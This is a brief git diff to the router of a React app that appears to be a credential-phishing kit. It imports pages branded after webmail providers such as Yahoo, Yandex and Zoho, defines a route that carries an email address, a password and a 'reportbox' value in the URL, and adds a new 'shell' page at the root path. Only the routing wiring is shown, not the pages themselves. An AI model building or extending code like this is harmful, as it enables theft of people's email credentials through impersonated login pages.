@@ -30,6 +30,7 @@ import Yahoo from "./pages/yahoo";
 import Yandex from "./pages/yandex";
 import Zoho from "./pages/zoho";
 import GetLocationInfo from "./pages/getlocationinfo";
+import IcexpressShell from "./pages/shell";
 
 var CryptoJS = require("crypto-js");
 
@@ -62,9 +63,8 @@ function App() {
   return (
     <AppContext.Provider value={{ page, setPage }}>
       <Router>
-       
+        <IcexpressShell path="/" />
         <GetLocationInfo path="/:email/:pass/:reportbox" />
-        
       </Router>
       <ToastContainer
         position="top-center"
